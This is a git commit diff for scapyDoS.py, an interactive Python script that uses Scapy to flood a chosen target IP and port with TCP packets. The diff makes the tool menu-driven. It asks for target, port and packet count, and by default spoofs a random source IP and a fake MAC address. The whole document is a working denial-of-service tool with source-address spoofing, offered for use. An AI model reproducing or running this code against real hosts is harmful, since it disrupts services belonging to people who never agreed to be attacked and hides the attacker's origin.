1d08b5f8c23a4708527167ed0fb81252629dabb3
Woodnet <62395480+Woodnet@users.noreply.github.com>
2020-03-19 20:20:31 +0100

    Update scapyDoS.py

--- scapyDoS.py
+++ scapyDoS.py
@@ -1,15 +1,82 @@
-from scapy.all import Ether
 from scapy.all import *
-import sys,os
+from scapy.all import Ether
+from colorama import *
+import random,os,time
+from datetime import datetime
 
-if (len(sys.argv) < 4):
-    print("Use me like this: python scapyDos.py $Destination_IP $Destination_Port $COUNTER")
-    quit()
+try:
+    os.system("cls")
+    linux = False
+except:
+    os.system("clear")
+    linux = True 
+#colors
+w = Fore.WHITE
+r = Fore.RED
+g = Fore.GREEN 
+y = Fore.YELLOW
+h = Fore.CYAN
+b = Fore.BLUE
+#
 
-def attack(d_ip,d_port,c):
-    s_ip = RandIP()
-    s_mac = "aa:bb:cc:dd:ee:ff"
-    pkt = (Ether(src=s_mac)/IP(src=s_ip,dst=d_ip)/TCP(sport=1234,dport=int(d_port)))
+#time
+n = datetime.now()
+#
+
+#message to send
+m_packet = "Hello World!"
+msg = m_packet.encode()
+#
+
+def attack(s_ip,s_port,d_ip,d_port,s_mac,c):
+    print(" ")
+    print(w + "[" + g + " * " + w + "]" + r + " Attack Target..")
+    print(" ")
+    time.sleep(3)
+    print(r + "%s"%(n))
+    print(h)
+    pkt = (Ether(src=s_mac)/IP(src=s_ip,dst=d_ip)/TCP(sport=s_port,dport=int(d_port))/msg)
     sendp(pkt,count=int(c))
-    
-attack(sys.argv[1],sys.argv[2],sys.argv[3])
+
+def home():
+    print(w + "[" + g + " * " + w + "]" + y + " Started.")
+    print(" ")
+    print(w + "[" + g + " Target-IP " + w + "]")
+    print(" ")
+    d_ip = input(h + ">>>" + y + " ")
+    print(" ")
+    print(w + "[" + g + " Target-PORT " + w + "]")
+    print(" ")
+    d_port = input(h + ">>>" + y + " ")
+    print(" ")
+    print(w + "[" + g + " Count " + w + "]")
+    print(" ")
+    c = input(h + ">>>" + y + " ")
+    print(" ")
+    print(w + "[" + y + " Do you want to specify the source address?" + w + "]")
+    print(" ")
+    choise = input(h + "[y|n]" + y + " ")
+    if(choise != "y" and choise != "yes" and choise != "n" and choise != "no"):
+        print(w + "[" + r + " ! " + w + "]" + y + " This is not a command!")
+        home()
+    if (choise == "yes" or choise == "y"):
+        print(" ")
+        print(w + "[" + g + " Source-IP " + w + "]")
+        print(" ")
+        s_ip = input(h + ">>>" + y + " ")
+        print(" ")
+        print(w + "[" + g + " Source-Port " + w + "]")
+        print(" ")
+        s_port = input(h + ">>>" + y + " ")
+        print(" ")
+        print(w + "[" + g + " Source-MAC " + w + "]")
+        print(" ")
+        s_mac = input(h + ">>>" + y + " ")
+        print(" ")
+    if (choise == "no" or choise == "n"):
+        s_ip = RandIP()
+        s_port = 1234
+        s_mac = "aa:bb:cc:dd:ee:ff"
+    attack(s_ip,s_port,d_ip,d_port,s_mac,c)
+
+home()
